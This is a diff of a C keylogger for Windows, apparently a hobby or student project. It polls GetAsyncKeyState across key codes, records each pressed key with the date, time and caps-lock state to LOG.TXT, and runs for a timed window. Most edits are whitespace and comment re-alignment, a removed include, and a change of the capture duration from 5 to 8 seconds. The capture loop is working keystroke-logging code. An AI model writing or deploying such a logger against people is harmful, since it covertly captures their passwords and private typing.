@@ -1,10 +1,9 @@
 #include<stdio.h>														//for input/output operations
 #include<time.h>														//use to define time functions
 #include<windows.h>						
-#include<stdlib.h>	                                                  	//defines variable types and various macros
 
 FILE *ptr,*f1,*f2;														//file pointer																		
-int day();																// function declarations
+int day();  															//function declarations
 int ti();																			
 int Save (int key, char *file);										
 				
@@ -13,7 +12,7 @@ int day(char *file)														// to calculate present day
 	ptr=fopen(file,"a+");														  //open file in append mode										
 		time_t t = time(NULL);													  //variable declaration of type time
 		struct tm tm = *localtime(&t);									          //this function returns a pointer to tm structure with time info filled in 
-		fprintf(ptr,"(%d-%d-%d)\n", tm.tm_year + 1900, tm.tm_mon + 1,tm.tm_mday);                       //prints in file LOG.TXT
+		fprintf(ptr,"(%d-%d-%d)\n", tm.tm_year + 1900, tm.tm_mon + 1,tm.tm_mday);       //prints in file LOG.TXT
 		if(GetKeyState(VK_CAPITAL))												  //checks whether input key is pressed or not
 		{
 			fprintf(ptr,"%s \n","capslock is on");
@@ -40,9 +39,9 @@ int ti()																            // to calculate at which time the key is pre
 {
 	time_t raw_time;																//variable of time type
     struct tm *ptr_ts;																//structure tm is created to store time variables
-    time ( &raw_time );																//pre-defined time function
+    time ( &raw_time );															//pre-defined time function
     ptr_ts = gmtime ( &raw_time );											
-	if((ptr_ts->tm_min+30)>=60)													//checks for minutes in IST
+	if((ptr_ts->tm_min+30)>=60)												//checks for minutes in IST
 		{                
 			fprintf (ptr,"(%2d:%02d:%02d)\n",ptr_ts->tm_hour+5+1, ptr_ts->tm_min+30-60, ptr_ts->tm_sec);	
 		}	
@@ -196,21 +195,21 @@ int main()
 	
 	time_t endwait;
     time_t start = time(NULL);
-    time_t seconds = 5; 												// end loop after this time has elapsed
+    time_t seconds = 8; 												// end loop after this time has elapsed
     endwait = start + seconds;											
 
    	day("LOG.TXT");														//day function is called
 	
     while(start < endwait)
-	{		
+	{
 	   for(i=8;i<=190 ;i++)												//for loop to get KEY codes
 		{ 
-		start = time(NULL);
-		if(start>endwait)
+		 start = time(NULL);
+		    if(start>endwait)
 	        {
 	          break;
 			}
-		    if(GetAsyncKeyState(i)==-32767)						//checks whether the input key is -32767(0x8001) which checks if the key is pressed or not
+		    if(GetAsyncKeyState(i)==-32767)       					//checks whether the input key is -32767(0x8001) which checks if the key is pressed or not
 			{
               Save(i,"LOG.TXT");									//Save function is called 
 	        }
